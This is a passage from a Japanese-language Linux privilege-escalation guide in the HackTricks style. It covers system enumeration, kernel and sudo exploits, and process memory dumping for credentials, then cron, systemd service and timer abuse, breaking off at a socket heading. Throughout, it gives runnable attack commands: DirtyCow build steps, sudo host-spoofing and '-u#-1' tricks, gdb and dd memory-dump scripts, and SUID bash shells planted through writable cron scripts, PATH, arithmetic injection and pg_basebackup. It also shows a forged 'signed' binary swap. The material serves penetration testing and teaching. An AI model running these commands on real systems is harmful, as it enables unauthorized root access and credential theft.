# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS情報

稼働しているOSの情報を収集しましょう
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

もし **`PATH` 変数内の任意のフォルダに書き込み権限がある** 場合、いくつかの libraries や binaries を hijack できる可能性があります:
```bash
echo $PATH
```
### Env 情報

環境変数に興味深い情報、パスワードやAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version を確認し、escalate privileges に使える exploit があるか調べる
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い脆弱なカーネルの一覧と、既にコンパイル済みの **compiled exploits** はこちらで見つかります: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
他にも **compiled exploits** を見つけられるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトから脆弱なカーネルのすべてのバージョンを抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
カーネルのエクスプロイトを検索するのに役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (被害者上で実行、カーネル2.xのエクスプロイトのみをチェック)

常に **Googleでカーネルのバージョンを検索してください**、お使いのカーネルバージョンが既知のカーネルエクスプロイトに記載されている場合、そのエクスプロイトが有効であることを確信できます。

追加のカーネルエクスプロイ手法:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudoのバージョン

以下に記載されている脆弱な sudo バージョンに基づいて:
```bash
searchsploit sudo
```
この grep を使用して sudo のバージョンが脆弱かどうか確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudoの1.9.17p1未満のバージョン（**1.9.14 - 1.9.17 < 1.9.17p1**）は、ユーザー管理ディレクトリから `/etc/nsswitch.conf` が使用される場合に、非特権ローカルユーザーが sudo の `--chroot` オプションを使って root に権限昇格できる問題があります。

[PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) はその [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) を悪用するものです。エクスプロイトを実行する前に、`sudo` のバージョンが脆弱であり `chroot` 機能をサポートしていることを確認してください。

詳細はオリジナルの [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) を参照してください。

### Sudo host-based rules bypass (CVE-2025-32462)

Sudoの1.9.17p1未満（報告された影響範囲: **1.8.8–1.9.17**）は、`sudo -h <host>` で指定される**ユーザー提供のホスト名**を使用してホストベースの sudoers ルールを評価し、**実際のホスト名**を使わない場合があります。sudoers が別のホストに対してより広い権限を付与している場合、ローカルでそのホストを**spoof**できます。

要件:
- 脆弱な `sudo` バージョン
- ホスト固有の sudoers ルール（ホストが現在のホスト名でも `ALL` でもない）

Example sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
許可されたホストをspoofingしてExploitする:
```bash
sudo -h devbox id
sudo -h devbox -i
```
spoofed name の解決がブロックされる場合は、`/etc/hosts` に追加するか、DNS lookups を避けるために logs/configs に既に出ているホスト名を使用してください。

#### sudo < v1.8.28

提供: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg シグネチャの検証に失敗しました

このvulnがどのように悪用されるかの**例**については、**smasher2 box of HTB**を確認してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御策を列挙

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

コンテナ内にいる場合は、まず以下の container-security セクションを確認し、その後ランタイム固有の悪用ページに移動してください：

{{#ref}}
container-security/
{{#endref}}

## ドライブ

**何がマウントされていて何がアンマウントされているか**、どこにあり、なぜそうなっているかを確認する。アンマウントされているものがあれば、マウントして機密情報を確認してみる。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか**を確認してください。これは、kernel exploit を使用する必要がある場合に有用です。kernel exploit は、使用するマシン（またはそれに類似したマシン）でコンパイルすることが推奨されます。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### インストールされている脆弱なソフトウェア

**インストールされているパッケージやサービスのバージョン**を確認してください。例えば、古い Nagios のバージョンが存在し、escalating privileges に悪用される可能性があります…\
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することをおすすめします。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンに SSH アクセスがある場合、**openVAS** を使ってマシン内にインストールされている古いまたは脆弱なソフトウェアをチェックできます。

> [!NOTE] > _これらのコマンドは大量の情報を表示し、その大部分はほとんど役に立たないことが多いことに注意してください。したがって、OpenVAS や同様のアプリケーションを使って、インストールされているソフトウェアのバージョンが既知の exploits に対して脆弱かどうかを確認することを推奨します_

## Processes

**どのプロセス**が実行されているかを確認し、任意のプロセスが**本来必要とされる以上の権限を持っているか**を確認してください（例えば tomcat が root によって実行されているなど）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
また **プロセスのバイナリに対する権限を確認してください**。誰かのバイナリを上書きできるかもしれません。

### クロスユーザの親子チェーン

親とは**異なるユーザー**で動作している子プロセスは必ずしも悪意があるわけではありませんが、有用な**トリアージのシグナル**です。いくつかの遷移は想定されます（`root`がサービスユーザーを生成する、ログインマネージャーがセッションプロセスを作る等）が、異常なチェーンはラッパー、デバッグヘルパー、永続化、あるいは弱いランタイムの信頼境界を明らかにすることがあります。

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
予想外のチェインを見つけたら、親コマンドラインとその挙動に影響を与えるすべてのファイル（`config`、`EnvironmentFile`、ヘルパースクリプト、作業ディレクトリ、書き込み可能な引数）を調査してください。いくつかの実際の privesc パスでは、子プロセス自体は書き込み可能ではなかったが、**親が制御する設定**やヘルパーチェインが書き込み可能であったことがあります。

### Deleted executables and deleted-open files

ランタイムのアーティファクトは多くの場合、**削除後**でもアクセス可能なままです。これは privilege escalation に役立つだけでなく、すでに機密ファイルを開いているプロセスから証拠を回収する際にも有用です。

削除された実行ファイルを確認する:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
`/proc/<PID>/exe` が `(deleted)` を指している場合、そのプロセスはメモリ上の古いバイナリイメージをまだ実行しています。これは調査すべき強いシグナルです。理由は次のとおりです:

- 削除された実行ファイルに有用な文字列や認証情報が含まれている可能性がある
- 実行中のプロセスがまだ有用なファイルディスクリプタを公開している可能性がある
- 削除された特権バイナリは、最近の改竄やログ消去の試みを示していることがある

削除済みのオープンファイルをシステム全体で収集する:
```bash
lsof +L1
```
興味深い descriptor を見つけたら、直接取得してください:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
これは、プロセスが削除された secret、script、database export、または flag file を開いたままにしている場合に特に有用です。

### プロセスの監視

プロセスを監視するために [**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用できます。これは、脆弱なプロセスが頻繁に実行されている場合や、特定の条件が満たされたときにそれらを特定するのに非常に有用です。

### プロセスのメモリ

一部のサーバサービスは、**credentials in clear text inside the memory** を保存します。\
通常、他のユーザに属するプロセスのメモリを読むには **root privileges** が必要なため、これは通常、既に root でさらに credentials を発見したい場合により有用です。\
ただし、**as a regular user you can read the memory of the processes you own** ことを忘れないでください。

> [!WARNING]
> 現在、多くのマシンは **don't allow ptrace by default** であることに注意してください。これは、非特権ユーザに属する他のプロセスをダンプできないことを意味します。
>
> ファイル _**/proc/sys/kernel/yama/ptrace_scope**_ が ptrace のアクセス制御を行います:
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid であればすべてのプロセスをデバッグできます。これは ptrace の従来の動作方法です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみがデバッグ可能です。
> - **kernel.yama.ptrace_scope = 2**: 管理者のみが ptrace を使用できます（CAP_SYS_PTRACE が必要）。
> - **kernel.yama.ptrace_scope = 3**: ptrace によるトレースは一切できません。一度設定されると、ptrace を再度有効にするには再起動が必要です。

#### GDB

例えば FTP サービスのメモリにアクセスできる場合、Heap を取得してその中の credentials を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセスIDについて、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているかを示し**、各マッピング領域の**権限**も表示します。  
**mem** 疑似ファイルは**プロセスのメモリ自体を参照可能にします**。  
**maps** ファイルから、どの**メモリ領域が読み取り可能か**とそのオフセットが分かります。  
この情報を使って、**mem ファイルをシークして読み取り可能なすべての領域をダンプする**ためにファイルへ書き出します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの **物理メモリ** へのアクセスを提供し、仮想メモリではありません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDumpは、WindowsのSysinternalsツールスイートにあるクラシックなProcDumpツールをLinux向けに再構想したものです。入手先は [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、次のツールが使えます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動でrootの要件を削除して、あなたが所有するprocessをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (rootが必要です)

### Process MemoryからのCredentials

#### 手動の例

authenticator process が稼働している場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをdumpし（前のセクション参照：プロセスのmemoryをダンプするさまざまな方法）、memory内のcredentialsを検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

このツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、メモリから**平文の認証情報を窃取**し、一部の**既知のファイル**からも取得します。正常に動作させるには root 権限が必要です。

| 機能                                              | プロセス名            |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュール/Cron ジョブ

### Crontab UI (alseambusher) が rootとして実行されている – web-based scheduler privesc

もし web “Crontab UI” パネル (alseambusher/crontab-ui) が rootとして動作し、loopback にしかバインドされていない場合でも、SSH local port-forwarding を使って到達し、特権ジョブを作成して権限を昇格させることができます。

Typical chain
- loopback のみでリッスンしているポート（例: 127.0.0.1:8000）と Basic-Auth realm を `ss -ntlp` / `curl -v localhost:8000` で発見する
- 運用アーティファクトから認証情報を見つける:
  - バックアップやスクリプト内（例: `zip -P <password>`）
  - systemd unit に `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` として露出しているもの
- トンネルしてログイン:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限の job を作成して即実行する (SUID shell を落とす):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使い方:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UIをrootとして実行しないこと；専用ユーザーと最小権限で制限する
- localhostにバインドし、さらにfirewall/VPNでアクセスを制限すること；passwordsを再利用しないこと
- unit filesにsecretsを埋め込まないこと；secret storesやroot-only EnvironmentFileを使用する
- オンデマンドのジョブ実行に対してaudit/loggingを有効にする



スケジュールされたジョブに脆弱性がないか確認する。rootによって実行されるスクリプトを悪用できるかもしれない（wildcard vuln? rootが使用するファイルを変更できるか? symlinksを使えるか? rootが使用するディレクトリに特定のファイルを作成する?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
もし `run-parts` が使われている場合、実際に実行される名前を確認する:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
これは誤検知を回避します。書き込み可能な periodic ディレクトリは、ペイロードのファイル名がローカルの `run-parts` ルールに一致する場合にのみ有用です。

### Cron path

例えば、_/etc/crontab_ の中では次の PATH を見つけることができます: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_/home/user に対してユーザー "user" が書き込み権限を持っている点に注意_)

この crontab の中で root が PATH を設定せずにコマンドやスクリプトを実行しようとする場合、例えば: _\* \* \* \* root overwrite.sh_\
その場合、次のようにして root shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron がワイルドカードを含むスクリプトを使う場合 (Wildcard Injection)

スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、予期しない挙動（privesc のような）を引き起こすためにこれを悪用できます。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**wildcardが次のようなパスに続く場合** _**/some/path/\***_ **、脆弱ではありません（** _**./\***_ **も脆弱ではありません）。**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### cron のログパーサーにおける Bash arithmetic expansion injection

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

root によって実行される **cron script を変更できる** 場合、非常に簡単にシェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
rootによって実行されるscriptが**directory where you have full access**を使用している場合、そのfolderを削除して、あなたが管理するscriptを提供する別の場所への**create a symlink folder to another one**を作成すると有用かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlinkの検証とより安全なファイル処理

ファイルをパスで読み書きする特権スクリプト/バイナリをレビューするとき、リンクがどのように扱われているかを確認してください:

- `stat()` は symlink を追跡し、対象のメタデータを返します。
- `lstat()` はリンク自体のメタデータを返します。
- `readlink -f` と `namei -l` は最終的なターゲットを解決するのに役立ち、各パスコンポーネントの権限を表示します。
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
For defenders/developers, safer patterns against symlink tricks include:

- `O_EXCL` with `O_CREAT`: fail if the path already exists (blocks attacker pre-created links/files).
- `openat()`: operate relative to a trusted directory file descriptor.
- `mkstemp()`: create temporary files atomically with secure permissions.

### カスタム署名された cron バイナリ（書き込み可能なペイロード）
Blue teams は、cron ドリブンのバイナリを実行する前にカスタム ELF セクションをダンプしてベンダー文字列を grep することで「署名」を確認することがあります。もしそのバイナリが group-writable（例: `/opt/AV/periodic-checks/monitor` が `root:devs 770`）で、signing material を leak できるなら、そのセクションを偽造して cron タスクをハイジャックできます:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### 頻繁に実行される cron ジョブ
プロセスを監視して、1分、2分、5分ごとに実行されているプロセスを探すことができます。うまく利用すれば権限昇格に繋がるかもしれません。

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**また使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これは開始するすべてのプロセスを監視して一覧表示します)。

### 攻撃者が設定したモードビットを保持する root バックアップ (pg_basebackup)

If a root-owned cron wraps `pg_basebackup` (or any recursive copy) against a database directory you can write to, you can plant a **SUID/SGID binary** that will be recopied as **root:root** with the same mode bits into the backup output.

典型的な発見フロー（低権限のDBユーザとして）：
- `pspy` を使って、root の cron が毎分 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` のようなコマンドを呼んでいるのを検出する。
- ソースクラスタ（例：`/var/lib/postgresql/14/main`）があなたによって書き込み可能であり、ジョブ実行後に宛先（`/opt/backups/current`）が root 所有になることを確認する。

エクスプロイト:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
これは `pg_basebackup` がクラスターをコピーする際にファイルモードビットを保持するためで、root によって呼び出されると宛先ファイルは **root ownership + attacker-chosen SUID/SGID** を継承します。パーミッションを保持したまま実行可能な場所に書き込む同様の特権付きバックアップ/コピー処理は脆弱です。

### 見えない cron jobs

cronjob を **コメントの後にキャリッジリターンを入れる**（改行文字を入れずに）ことで作成でき、cron job は動作します。例（キャリッジリターン文字に注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
この種の stealth entry を検出するには、control characters を表示するツールで cron files を調べてください:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の`.service`ファイルに書き込みできるか確認してください。もし可能なら、それを**変更**してサービスが**開始**、**再起動**、または**停止**したときにあなたの**backdoorを実行**するようにできます（マシンの再起動を待つ必要があるかもしれません）。\  
例えば、`.service`ファイル内にbackdoorを作成し、**`ExecStart=/tmp/script.sh`** のように指定します。

### 書き込み可能なサービスバイナリ

もし**write permissions over binaries being executed by services**があるなら、それらを書き換えてbackdoorsを仕込めば、サービスが再実行されたときにそれらが実行されます。

### systemd PATH - 相対パス

**systemd**が使用するPATHは次のコマンドで確認できます:
```bash
systemctl show-environment
```
パス内の任意のフォルダに**write**できることが判明した場合、**escalate privileges**できる可能性があります。次のような**relative paths being used on service configurations**ファイルを検索する必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、systemd の PATH フォルダ内で書き込み可能な場所に、**executable** でかつ **same name as the relative path binary** の名前を持つファイルを作成し、サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されたときに、あなたの **backdoor will be executed**（通常、権限のないユーザはサービスの開始/停止ができませんが、`sudo -l` が使えるか確認してください）。

**サービスについては `man systemd.service` を参照してください。**

## **タイマー**

**タイマー** は名前が `**.timer**` で終わる systemd unit ファイルで、`**.service**` ファイルやイベントを制御します。**タイマー** はカレンダー時間イベントや単調時間イベントの組み込みサポートがあり、非同期で実行できるため、cron の代替として使用できます。

すべてのタイマーは次のコマンドで列挙できます:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できれば、systemd.unit の既存のユニット（例えば `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントでは Unit が何であるか次のように記載されています:

> このタイマーが満了したときにアクティブ化されるユニット。引数はサフィックスが ".timer" でないユニット名です。指定されていない場合、この値はタイマー ユニットと同じ名前（サフィックスを除く）を持つ service にデフォルトされます（上参照）。アクティブ化されるユニット名とタイマー ユニットのユニット名は、サフィックス以外は同一にすることが推奨されます。

したがって、この権限を悪用するには次のことが必要になります:

- `.service` のような systemd ユニットで、**書き込み可能なバイナリを実行している**ものを見つける
- 相対パスを**実行している** systemd ユニットを見つけ、かつその実行ファイルを偽装するために**systemd PATH** に対して**書き込み権限**を持っている

**タイマーの詳細は `man systemd.timer` を参照してください。**

### **タイマーの有効化**

タイマーを有効にするには root 権限が必要で、次を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** は `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` に対するシンボリックリンクを作成することで **有効化されます**

## ソケット

Unix Domain Sockets (UDS) は、クライアント-サーバモデル内で同一マシンまたは別マシン間のプロセス間通信を可能にします。これらはコンピュータ間通信のために標準の Unix ディスクリプタファイルを利用し、`.socket` ファイルを介して設定されます。

Sockets can be configured using `.socket` files.

**詳細は `man systemd.socket` を参照してください。** このファイル内では、いくつかの興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは用途が異なりますが、要約すると **どこでソケットをリッスンするかを指定します**（AF_UNIX ソケットファイルのパス、IPv4/6 および/またはリッスンするポート番号など）。
- `Accept`: ブール引数を取ります。`true` の場合、**着信ごとにサービスのインスタンスが生成され**、接続ソケットのみがそのインスタンスに渡されます。`false` の場合、すべてのリッスンソケット自体が**起動された service unit に渡され**、すべての接続に対して単一の service unit が生成されます。この値は datagram ソケットや FIFO では無視され、単一の service unit が無条件にすべての着信トラフィックを処理します。**デフォルトは false** です。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法でのみ書くことが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1 行以上のコマンドラインを取り、これらはそれぞれリッスンする **ソケット**/FIFO が **作成されバインドされる前** または **後** に **実行されます**。コマンドラインの最初のトークンは絶対ファイル名でなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする **ソケット**/FIFO が **閉じられ削除される前** または **後** に **実行される追加のコマンド**。
- `Service`: 着信トラフィック時に **アクティベートする service unit の名前** を指定します。この設定は Accept=no のソケットのみ許可されます。デフォルトではソケットと同名の service（サフィックスを置換したもの）になります。ほとんどの場合、このオプションを使う必要はありません。

### Writable .socket files

